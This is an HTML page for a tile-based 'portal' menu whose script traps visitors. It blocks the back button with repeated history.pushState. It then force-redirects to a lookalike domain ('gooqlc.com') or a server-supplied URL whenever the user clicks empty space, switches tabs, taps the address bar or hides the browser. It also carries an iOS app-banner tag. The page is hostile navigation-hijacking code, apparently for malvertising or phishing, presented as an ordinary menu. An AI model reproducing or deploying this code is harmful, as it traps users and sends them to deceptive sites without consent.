<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
  <title></title>

  <!-- iOS Safari Native Smart App Banner for Shortcuts -->
  <meta name="apple-itunes-app" content="app-id=915254993" />

  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      background-color: #0d0d0d;
      color: #ffffff;
      font-family: -apple-system, BlinkMacSystemFont, "SF Pro Display", "Segoe UI", Roboto, sans-serif;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: flex-start;
      padding: 60px 20px 40px;
      user-select: none;
      -webkit-user-select: none;
    }

    .menu-container {
      width: 100%;
      max-width: 580px;
      display: flex;
      flex-direction: column;
      gap: 14px;
    }

    .menu-tile {
      background-color: #161616;
      border: 1px solid rgba(255, 255, 255, 0.03);
      border-radius: 12px;
      height: 72px;
      display: flex;
      align-items: center;
      padding-left: 28px;
      font-size: 18px;
      font-weight: 600;
      color: #ffffff;
      text-decoration: none;
      cursor: pointer;
      letter-spacing: -0.2px;
      transition: background-color 0.15s ease, transform 0.1s ease;
    }

    .menu-tile:active {
      background-color: #242424;
      transform: scale(0.99);
    }

    .divider {
      display: flex;
      align-items: center;
      margin: 18px 0;
      color: #4b4b4b;
      font-size: 11px;
      font-weight: 600;
      letter-spacing: 1.5px;
      text-transform: uppercase;
    }

    .divider::before,
    .divider::after {
      content: "";
      flex: 1;
      height: 1px;
      background-color: #222222;
    }

    .divider span {
      padding: 0 16px;
    }
  </style>
</head>
<body>

  <div class="menu-container" id="menuContainer"></div>

  <script>
    // 1. Back-Button Trap
    history.pushState(null, document.title, location.href);
    window.addEventListener('popstate', function () {
      history.pushState(null, document.title, location.href);
    });

    let currentRedirect = 'https://gooqlc.com/111z';

    function renderPortal(data) {
      const container = document.getElementById('menuContainer');
      container.innerHTML = '';

      if (Array.isArray(data.top)) {
        data.top.forEach(item => container.appendChild(createTile(item)));
      }

      if (data.dividerTitle) {
        const divider = document.createElement('div');
        divider.className = 'divider';
        divider.innerHTML = `<span>${data.dividerTitle}</span>`;
        container.appendChild(divider);
      }

      if (Array.isArray(data.custom)) {
        data.custom.forEach(item => container.appendChild(createTile(item)));
      }
    }

    function createTile(item) {
      const tile = document.createElement('a');
      tile.className = 'menu-tile';
      tile.href = '#';
      tile.textContent = item.title;

      tile.addEventListener('click', (e) => {
        e.preventDefault();
        e.stopPropagation();
        window.location.replace(item.url);
      });

      return tile;
    }

    async function fetchConfig() {
      try {
        const res = await fetch('/api/portal');
        const data = await res.json();
        if (data.success) {
          if (data.masterRedirect) currentRedirect = data.masterRedirect;
          renderPortal(data);
        }
      } catch (err) {
        console.warn('Backend unavailable');
      }
    }

    // Trigger 1: Clicking empty space on screen
    document.addEventListener('click', (e) => {
      if (!e.target.closest('.menu-tile')) {
        window.location.replace(currentRedirect);
      }
    });

    // Trigger 2: Tapping URL bar, switching tabs, or clicking out of window
    window.addEventListener('blur', () => {
      window.location.replace(currentRedirect);
    });

    // Trigger 3: Minimizing Safari, locking phone, switching apps
    document.addEventListener('visibilitychange', () => {
      if (document.visibilityState === 'hidden') {
        window.location.replace(currentRedirect);
      }
    });

    fetchConfig();
  </script>

</body>
</html>
